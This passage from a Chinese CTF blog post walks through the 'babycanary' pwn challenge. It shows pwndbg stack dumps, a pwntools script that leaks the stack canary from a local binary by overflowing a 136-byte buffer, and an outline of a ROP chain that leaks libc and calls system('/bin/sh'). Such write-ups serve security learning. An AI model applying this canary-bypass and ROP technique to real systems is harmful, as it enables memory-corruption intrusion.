<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> stack 50</span><br><span class="line">00:0000│ rsi rsp  0x7fffffffddb0 ◂— 0x6141316141306141 ('Aa0Aa1Aa')</span><br><span class="line">01:0008│          0x7fffffffddb8 ◂— 0x4134614133614132 ('2Aa3Aa4A')</span><br><span class="line">02:0010│          0x7fffffffddc0 ◂— 0x3761413661413561 ('a5Aa6Aa7')</span><br><span class="line">03:0018│          0x7fffffffddc8 ◂— 0x6241396141386141 ('Aa8Aa9Ab')</span><br><span class="line">04:0020│          0x7fffffffddd0 ◂— 0x4132624131624130 ('0Ab1Ab2A')</span><br><span class="line">05:0028│          0x7fffffffddd8 ◂— 0x3562413462413362 ('b3Ab4Ab5')</span><br><span class="line">06:0030│          0x7fffffffdde0 ◂— 0x6241376241366241 ('Ab6Ab7Ab')</span><br><span class="line">07:0038│          0x7fffffffdde8 ◂— 0x4130634139624138 ('8Ab9Ac0A')</span><br><span class="line">08:0040│          0x7fffffffddf0 ◂— 0x3363413263413163 ('c1Ac2Ac3')</span><br><span class="line">09:0048│          0x7fffffffddf8 ◂— 0x6341356341346341 ('Ac4Ac5Ac')</span><br><span class="line">0a:0050│          0x7fffffffde00 ◂— 0x4138634137634136 ('6Ac7Ac8A')</span><br><span class="line">0b:0058│          0x7fffffffde08 ◂— 0x3164413064413963 ('c9Ad0Ad1')</span><br><span class="line">0c:0060│          0x7fffffffde10 ◂— 0x6441336441326441 ('Ad2Ad3Ad')</span><br><span class="line">0d:0068│          0x7fffffffde18 ◂— 0x4136644135644134 ('4Ad5Ad6A')</span><br><span class="line">0e:0070│          0x7fffffffde20 ◂— 0x3964413864413764 ('d7Ad8Ad9')</span><br><span class="line">0f:0078│          0x7fffffffde28 ◂— 0x6541316541306541 ('Ae0Ae1Ae')</span><br><span class="line">10:0080│          0x7fffffffde30 —▸ 0x40070a ◂— add    byte ptr [rax], al</span><br><span class="line">11:0088│          0x7fffffffde38 ◂— 0x8b5843fb32c04100</span><br><span class="line">12:0090│ rbp      0x7fffffffde40 —▸ 0x7fffffffde50 —▸ 0x400790 ◂— push   r15</span><br><span class="line">13:0098│          0x7fffffffde48 —▸ 0x40077e ◂— mov    eax, 0</span><br><span class="line">14:00a0│          0x7fffffffde50 —▸ 0x400790 ◂— push   r15</span><br><span class="line">15:00a8│          0x7fffffffde58 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">16:00b0│          0x7fffffffde60 —▸ 0x7fffffffdf38 —▸ 0x7fffffffe2a9 ◂— '/home/syc/Documents/challange/babycanary/babycanary'</span><br><span class="line">... ↓</span><br><span class="line">18:00c0│          0x7fffffffde70 ◂— 0x1f7b99608</span><br><span class="line">19:00c8│          0x7fffffffde78 —▸ 0x400770 ◂— push   rbp</span><br><span class="line">1a:00d0│          0x7fffffffde80 ◂— 0x0</span><br><span class="line">1b:00d8│          0x7fffffffde88 ◂— 0x4b03463a62f1fbbf</span><br><span class="line">1c:00e0│          0x7fffffffde90 —▸ 0x4005a0 ◂— xor    ebp, ebp</span><br><span class="line">1d:00e8│          0x7fffffffde98 —▸ 0x7fffffffdf30 ◂— 0x1</span><br><span class="line">1e:00f0│          0x7fffffffdea0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">20:0100│          0x7fffffffdeb0 ◂— 0xb4fcb945d111fbbf</span><br><span class="line">21:0108│          0x7fffffffdeb8 ◂— 0xb4fca9ffc201fbbf</span><br><span class="line">22:0110│          0x7fffffffdec0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">25:0128│          0x7fffffffded8 —▸ 0x7fffffffdf48 —▸ 0x7fffffffe2dd ◂— 'XDG_VTNR=7'</span><br><span class="line">26:0130│          0x7fffffffdee0 —▸ 0x7ffff7ffe168 ◂— 0x0</span><br><span class="line">27:0138│          0x7fffffffdee8 —▸ 0x7ffff7de77db (_dl_init+139) ◂— jmp    0x7ffff7de77b0</span><br><span class="line">28:0140│          0x7fffffffdef0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">2a:0150│          0x7fffffffdf00 —▸ 0x4005a0 ◂— xor    ebp, ebp</span><br><span class="line">2b:0158│          0x7fffffffdf08 —▸ 0x7fffffffdf30 ◂— 0x1</span><br><span class="line">2c:0160│          0x7fffffffdf10 ◂— 0x0</span><br><span class="line">2d:0168│          0x7fffffffdf18 —▸ 0x4005c9 ◂— hlt    </span><br><span class="line">2e:0170│          0x7fffffffdf20 —▸ 0x7fffffffdf28 ◂— 0x1c</span><br><span class="line">2f:0178│          0x7fffffffdf28 ◂— 0x1c</span><br><span class="line">30:0180│ r13      0x7fffffffdf30 ◂— 0x1</span><br><span class="line">31:0188│          0x7fffffffdf38 —▸ 0x7fffffffe2a9 ◂—</span><br></pre></td></tr></table></figure>

<p>从<code>11:0088│          0x7fffffffde38 ◂— 0x8b5843fb32c04100</code>可以知道这就是<strong>Canary</strong>的值，那我们还需要增加字符串长度，正好溢出到canary的位置，则根据计算<strong>hex(30-28=8)</strong>,则需要生成<strong>136</strong>个字符</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Documents/challange$ python pattern.py create 136</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4A</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> stack 50</span><br><span class="line">00:0000│ rax rsi rsp  0x7fffffffddb0 ◂— 0x6141316141306141 ('Aa0Aa1Aa')</span><br><span class="line">01:0008│              0x7fffffffddb8 ◂— 0x4134614133614132 ('2Aa3Aa4A')</span><br><span class="line">02:0010│              0x7fffffffddc0 ◂— 0x3761413661413561 ('a5Aa6Aa7')</span><br><span class="line">03:0018│              0x7fffffffddc8 ◂— 0x6241396141386141 ('Aa8Aa9Ab')</span><br><span class="line">04:0020│              0x7fffffffddd0 ◂— 0x4132624131624130 ('0Ab1Ab2A')</span><br><span class="line">05:0028│              0x7fffffffddd8 ◂— 0x3562413462413362 ('b3Ab4Ab5')</span><br><span class="line">06:0030│              0x7fffffffdde0 ◂— 0x6241376241366241 ('Ab6Ab7Ab')</span><br><span class="line">07:0038│              0x7fffffffdde8 ◂— 0x4130634139624138 ('8Ab9Ac0A')</span><br><span class="line">08:0040│              0x7fffffffddf0 ◂— 0x3363413263413163 ('c1Ac2Ac3')</span><br><span class="line">09:0048│              0x7fffffffddf8 ◂— 0x6341356341346341 ('Ac4Ac5Ac')</span><br><span class="line">0a:0050│              0x7fffffffde00 ◂— 0x4138634137634136 ('6Ac7Ac8A')</span><br><span class="line">0b:0058│              0x7fffffffde08 ◂— 0x3164413064413963 ('c9Ad0Ad1')</span><br><span class="line">0c:0060│              0x7fffffffde10 ◂— 0x6441336441326441 ('Ad2Ad3Ad')</span><br><span class="line">0d:0068│              0x7fffffffde18 ◂— 0x4136644135644134 ('4Ad5Ad6A')</span><br><span class="line">0e:0070│              0x7fffffffde20 ◂— 0x3964413864413764 ('d7Ad8Ad9')</span><br><span class="line">0f:0078│              0x7fffffffde28 ◂— 0x6541316541306541 ('Ae0Ae1Ae')</span><br><span class="line">10:0080│              0x7fffffffde30 ◂— 0x4134654133654132 ('2Ae3Ae4A')</span><br><span class="line">11:0088│              0x7fffffffde38 ◂— 0xfb83dc38787b3d0a</span><br><span class="line">12:0090│ rbp          0x7fffffffde40 —▸ 0x7fffffffde50 —▸ 0x400790 ◂— push   r15</span><br></pre></td></tr></table></figure>

<p>可以看到Canary的值就是<strong>0xfb83dc38787b3d0a</strong></p>
<p>这样子我们可以写一个脚本来暴露Canary的值了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">"./babycanary"</span>)</span><br><span class="line">gdb.attach(r,<span class="string">"b *0x400736"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">136</span></span><br><span class="line">r.sendlineafter(<span class="string">"tell me your name:\n"</span>,payload)</span><br><span class="line">r.recvuntil(<span class="string">'OK,'</span>+ <span class="string">"a"</span>*<span class="number">136</span>)</span><br><span class="line">canary = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary :"</span> + hex(canary)</span><br></pre></td></tr></table></figure>

<p>运行后可以得到Canary的值为：<strong>0xbc2b48de6267a90a</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0xa5 bytes:</span><br><span class="line">    00000000  4f 4b 2c 61  61 61 61 61  61 61 61 61  61 61 61 61  │OK,a│aaaa│aaaa│aaaa│</span><br><span class="line">    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000080  61 61 61 61  61 61 61 61  61 61 61 0a  a9 67 62 de  │aaaa│aaaa│aaa·│·gb·│</span><br><span class="line">    00000090  48 2b bc 70  cc 8b ca ff  7f 2c 6c 65  74 20 73 74  │H+·p│····│·,le│t st│</span><br><span class="line">    000000a0  61 72 74 21  0a                                     │art!│·│</span><br><span class="line">    000000a5</span><br><span class="line">canary :0xbc2b48de6267a90a</span><br></pre></td></tr></table></figure>

<p>通过GDB调试可以查看</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> stack 50</span><br><span class="line">00:0000│ rax rsi rsp  0x7fffca8bcbd0 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line">... ↓</span><br><span class="line">11:0088│              0x7fffca8bcc58 ◂— 0xbc2b48de6267a90a</span><br><span class="line">12:0090│ rbp          0x7fffca8bcc60 —▸ 0x7fffca8bcc70 —▸ 0x400790 ◂— push   r15</span><br><span class="line">13:0098│              0x7fffca8bcc68 —▸ 0x40077e ◂— mov    eax, 0</span><br><span class="line">14:00a0│              0x7fffca8bcc70 —▸ 0x400790 ◂— push   r15</span><br><span class="line">15:00a8│              0x7fffca8bcc78 —▸ 0x7fd06a5f1830 (__libc_start_main+240)</span><br></pre></td></tr></table></figure>

<p>我们的脚本是正确的，我们已经获取了绕过Canary，接下来就是普通的栈溢出题目了</p>
<p>可以覆盖返回地址为<strong>pop pop pop pop ret</strong>指令地址，返回时弹出<strong>0x18</strong>个填充字节和返回地址,返回到<strong>buf+0x20</strong>处，就避开了栈不可执行</p>
<p>在<strong>buf+0x20</strong>处构造<strong>ROP</strong>，通过write函数，先泄露<strong>libc</strong>基地址，返回到<strong>start</strong></p>
<p>重新执行，输入使之执行<strong>system(‘/bin/sh’)</strong></p>
<p>需要用到的信息，包括<strong>bss</strong>段的地址、<strong>main</strong>函数地址、程序中已有函数的地址、<strong>gadgets</strong>地址</p>

    </div>

    
    
    
        
      

      <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-next post-nav-item">
              
                <a href="/2019/09/18/║┌╢▄▒¡-2019-PWN-easypwn/" rel="next" title="黑盾杯-2019-PWN-easypwn">
                  <i class="fa fa-chevron-left"></i> 黑盾杯-2019-PWN-easypwn
                </a>
              
            </div>

            <span class="post-nav-divider"></span>

            <div class="post-nav-prev post-nav-item">
              
                <a href="/2019/09/24/fmtstr─ú┐Θ╡─╩╣╙├/" rel="prev" title="fmtstr模块的使用">
                  fmtstr模块的使用 <i class="fa fa-chevron-right"></i>
                </a>
              
            </div>
          </div>
        
      </footer>
    
  </div>
  
  
  
  </article>

  </div>


          </div>
          

        </div>
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">
        
        
        
        
      

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Inhaltsverzeichnis
        </li>
        <li class="sidebar-nav-overview">
          Übersicht
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Canary-原理"><span class="nav-number">1.</span> <span class="nav-text">Canary 原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#在-GCC-中使用-Canary"><span class="nav-number">1.1.</span> <span class="nav-text">在 GCC 中使用 Canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Canary-实现原理"><span class="nav-number">1.2.</span> <span class="nav-text">Canary 实现原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BabyCanary"><span class="nav-number">2.</span> <span class="nav-text">BabyCanary</span></a></li></ol></div>
        
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
  <div class="site-description" itemprop="description">Resit much,Obey little</div>
</div>
  <nav class="site-state motion-element">
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">71</span>
          <span class="site-state-item-name">Artikel</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-categories">
        
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">Kategorien</span>
        
      </div>
    
  </nav>
  <div class="feed-link motion-element">
    <a href="/atom.xml" rel="alternate">
      <i class="fa fa-rss"></i>RSS
    </a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
</div>
  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>

<div>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv" style='display:none'>
    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
    <span class="post-meta-divider">|</span>
</span>
<span id="busuanzi_container_site_uv" style='display:none'>
    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
</span>
</div>

        












        
      </div>
    </footer>
  </div>

  


  <script src="/lib/anime.min.js?v=3.1.0"></script>
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
<script src="/js/schemes/pisces.js?v=7.4.0"></script>

<script src="/js/next-boot.js?v=7.4.0"></script>



  








  <script src="/js/local-search.js?v=7.4.0"></script>














  

  

  

</body>
</html>
